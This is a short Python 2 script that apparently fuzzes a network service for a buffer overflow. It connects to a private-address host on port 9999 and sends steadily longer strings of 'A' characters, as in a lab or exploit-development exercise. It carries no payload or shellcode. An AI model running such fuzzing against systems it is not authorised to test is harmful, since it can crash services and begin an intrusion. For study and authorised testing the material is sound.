#!/usr/bin/python2
import socket
# create an array of buffers, while increasing them.
buffer=["A"]
counter = 100
while len(buffer) <= 30: 
     buffer.append("A"*counter)
     counter = counter + 200
for string in buffer: 
     print "Spiking with %s bytes" % len(string)
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     connect = s.connect(('192.168.1.51',9999))
     s.recv(1024) 
     s.send(string + '\r\n')
     s.close()
